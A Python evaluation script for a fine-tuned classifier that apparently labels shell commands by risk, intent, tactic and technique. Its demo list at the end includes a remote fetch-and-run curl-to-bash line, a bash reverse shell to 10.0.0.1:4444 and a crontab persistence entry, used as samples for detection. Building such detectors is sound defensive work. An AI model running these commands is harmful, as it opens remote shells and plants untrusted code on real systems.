"""Evaluate the fine-tuned GLiClass model and demo inference."""
from __future__ import annotations

import json
import sys
from pathlib import Path

import numpy as np
import torch

from gliclass import GLiClassModel, ZeroShotClassificationPipeline
from transformers import AutoTokenizer
from schema import all_label_ids, group_offsets

ROOT = Path(__file__).resolve().parents[1]
MODEL_DIR = ROOT / "model" / "checkpoints" / "final_model"
DATA_DIR = ROOT / "dataset" / "gliclass"

IDS = all_label_ids()
OFF = group_offsets()
RISK_IDS = IDS[OFF["risk"][0]: OFF["risk"][1]]
INTENT_IDS = IDS[OFF["intent"][0]: OFF["intent"][1]]
TACTIC_IDS = IDS[OFF["tactic"][0]: OFF["tactic"][1]]
TECH_IDS = IDS[OFF["technique"][0]: OFF["technique"][1]]


def load(model_dir=MODEL_DIR, device=None):
    device = device or ("cuda" if torch.cuda.is_available() else "cpu")
    model = GLiClassModel.from_pretrained(str(model_dir)).to(device).eval()
    tokenizer = AutoTokenizer.from_pretrained(str(model_dir))
    pipe = ZeroShotClassificationPipeline(model, tokenizer, max_classes=len(IDS),
                                          max_length=256, classification_type="multi-label",
                                          device=device, progress_bar=False)
    return pipe, model, device


def score_batch(pipe, texts, threshold=0.5):
    out = pipe(texts, labels=IDS, threshold=threshold)
    return out


def evaluate(pipe, test_json=DATA_DIR / "test.json", limit=None, threshold=0.5):
    data = json.loads(Path(test_json).read_text())
    if limit:
        data = data[:limit]
    texts = [d["text"] for d in data]
    true = [set(d["true_labels"]) for d in data]

    # pipeline returns, per text, a list of {label, score} dicts above threshold
    preds = []
    for i in range(0, len(texts), 32):
        chunk = texts[i:i+32]
        for r in score_batch(pipe, chunk, threshold=threshold):
            preds.append({d["label"] for d in r})

    risk_ok = 0
    tp = fp = fn = 0
    for t, p in zip(true, preds):
        true_risk = {l for l in t if l in RISK_IDS}
        pred_risk = {l for l in p if l in RISK_IDS}
        if true_risk and pred_risk and true_risk == pred_risk:
            risk_ok += 1
        # micro over all labels
        tp += len(p & t)
        fp += len(p - t)
        fn += len(t - p)
    prec = tp / max(1, tp + fp)
    rec = tp / max(1, tp + fn)
    f1 = 2 * prec * rec / max(1e-9, prec + rec)
    n = len(true)
    return {
        "samples": n,
        "risk_acc": risk_ok / max(1, n),
        "micro_f1": round(f1, 4),
        "micro_precision": round(prec, 4),
        "micro_recall": round(rec, 4),
    }


def demo(pipe, commands, threshold=0.5):
    for c in commands:
        r = pipe(c, labels=IDS, threshold=threshold)[0]
        scored = {d["label"]: d["score"] for d in r}
        labels = list(scored)
        risk = [l for l in labels if l in RISK_IDS]
        top = sorted(scored, key=lambda l: scored[l], reverse=True)
        print(f"\n{c}")
        print(f"  risk={risk}")
        print(f"  labels={top[:10]}")


if __name__ == "__main__":
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument("--model_dir", type=str, default=str(MODEL_DIR))
    ap.add_argument("--limit", type=int, default=None)
    ap.add_argument("--demo", action="store_true")
    args = ap.parse_args()
    pipe, model, device = load(model_dir=args.model_dir)
    print(f"model: {MODEL_DIR}  device={device}")
    metrics = evaluate(pipe, limit=args.limit)
    print("EVAL:", json.dumps(metrics, ensure_ascii=False))
    if args.demo:
        demo(pipe, [
            "curl -fsSL https://raw.githubusercontent.com/x/y/main/i.sh | bash",
            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
            "sudo systemctl restart nginx",
            "(crontab -l; echo '* * * * * /tmp/.x') | crontab -",
            "df -h && free -m && uptime",
        ])
